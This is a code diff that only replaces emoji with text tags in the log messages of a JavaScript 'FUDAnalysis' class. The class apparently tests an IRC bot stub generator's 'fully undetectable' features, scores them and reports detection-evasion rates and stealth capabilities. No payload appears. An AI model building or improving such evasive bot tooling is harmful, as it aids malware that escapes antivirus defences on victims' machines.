@@ -41,7 +41,7 @@ class FUDAnalysis {
 
     // Analyze FUD capabilities
     analyzeFUDFeatures() {
-        console.log('\n🔍 FUD CAPABILITY ANALYSIS');
+        console.log('\n[SEARCH] FUD CAPABILITY ANALYSIS');
         console.log('=' .repeat(50));
         
         const fudFeatures = {
@@ -129,11 +129,11 @@ class FUDAnalysis {
 
         // Display FUD analysis
         for (const [category, features] of Object.entries(fudFeatures)) {
-            console.log(`\n📋 ${category.toUpperCase()}`);
+            console.log(`\n[INFO] ${category.toUpperCase()}`);
             console.log('-'.repeat(30));
             
             for (const [feature, details] of Object.entries(features)) {
-                console.log(`\n🔸 ${feature}`);
+                console.log(`\n[INFO] ${feature}`);
                 console.log(`   Description: ${details.description}`);
                 console.log(`   Techniques: ${details.techniques.join(', ')}`);
                 console.log(`   Effectiveness: ${details.effectiveness}`);
@@ -146,7 +146,7 @@ class FUDAnalysis {
 
     // Test FUD effectiveness
     async testFUDEffectiveness() {
-        console.log('\n🧪 FUD EFFECTIVENESS TESTING');
+        console.log('\n[TEST] FUD EFFECTIVENESS TESTING');
         console.log('=' .repeat(50));
 
         const testConfig = {
@@ -209,7 +209,7 @@ class FUDAnalysis {
 
         for (const config of fudConfigs) {
             try {
-                console.log(`\n🔬 Testing ${config.name}...`);
+                console.log(`\n[INFO] Testing ${config.name}...`);
                 
                 const result = await this.apiCall('/irc-bot/generate-stub', 'POST', {
                     config: testConfig,
@@ -220,7 +220,7 @@ class FUDAnalysis {
 
                 if (result.status === 200) {
                     const bot = result.data.result.bots.cpp;
-                    console.log(`✅ ${config.name} generated successfully`);
+                    console.log(`[OK] ${config.name} generated successfully`);
                     console.log(`   - Size: ${bot.size} bytes`);
                     console.log(`   - Encrypted: ${bot.encrypted}`);
                     console.log(`   - FUD Features: ${bot.fudFeatures ? bot.fudFeatures.length : 0}`);
@@ -233,10 +233,10 @@ class FUDAnalysis {
                     const fudScore = this.calculateFUDScore(config.options);
                     console.log(`   - FUD Score: ${fudScore}/100`);
                 } else {
-                    console.log(`❌ ${config.name} generation failed`);
+                    console.log(`[ERROR] ${config.name} generation failed`);
                 }
             } catch (error) {
-                console.log(`❌ ${config.name} error: ${error.message}`);
+                console.log(`[ERROR] ${config.name} error: ${error.message}`);
             }
         }
     }
@@ -273,7 +273,7 @@ class FUDAnalysis {
 
     // Generate FUD report
     generateFUDReport() {
-        console.log('\n📊 FUD CAPABILITY REPORT');
+        console.log('\n[CHART] FUD CAPABILITY REPORT');
         console.log('=' .repeat(50));
         
         const report = {
@@ -308,24 +308,24 @@ class FUDAnalysis {
             }
         };
 
-        console.log(`\n🎯 Overall FUD Score: ${report.overallFUDScore}/100`);
+        console.log(`\n[TARGET] Overall FUD Score: ${report.overallFUDScore}/100`);
         
-        console.log('\n✅ STRENGTHS:');
+        console.log('\n[OK] STRENGTHS:');
         report.strengths.forEach(strength => {
             console.log(`   • ${strength}`);
         });
         
-        console.log('\n⚠️  WEAKNESSES:');
+        console.log('\n[WARN]  WEAKNESSES:');
         report.weaknesses.forEach(weakness => {
             console.log(`   • ${weakness}`);
         });
         
-        console.log('\n💡 RECOMMENDATIONS:');
+        console.log('\n[IDEA] RECOMMENDATIONS:');
         report.recommendations.forEach(rec => {
             console.log(`   • ${rec}`);
         });
         
-        console.log('\n📈 DETECTION EVASION RATES:');
+        console.log('\n[UP] DETECTION EVASION RATES:');
         for (const [type, rate] of Object.entries(report.detectionEvasion)) {
             console.log(`   ${type}: ${rate}`);
         }
@@ -335,7 +335,7 @@ class FUDAnalysis {
 
     // Run complete FUD analysis
     async runCompleteAnalysis() {
-        console.log('🔍 RawrZ FUD Analysis - Comprehensive Assessment');
+        console.log('[SEARCH] RawrZ FUD Analysis - Comprehensive Assessment');
         console.log('=' .repeat(60));
         
         try {
@@ -348,7 +348,7 @@ class FUDAnalysis {
             // Generate FUD report
             this.generateFUDReport();
             
-            console.log('\n🎉 FUD Analysis Complete!');
+            console.log('\n[SUCCESS] FUD Analysis Complete!');
             console.log('\nCONCLUSION:');
             console.log('The IRC bot stub generation system provides strong FUD capabilities');
             console.log('with comprehensive anti-analysis, evasion, and stealth features.');
@@ -356,7 +356,7 @@ class FUDAnalysis {
             console.log('against most common detection methods and analysis techniques.');
             
         } catch (error) {
-            console.log('\n❌ FUD Analysis failed:', error.message);
+            console.log('\n[ERROR] FUD Analysis failed:', error.message);
         }
     }
 }
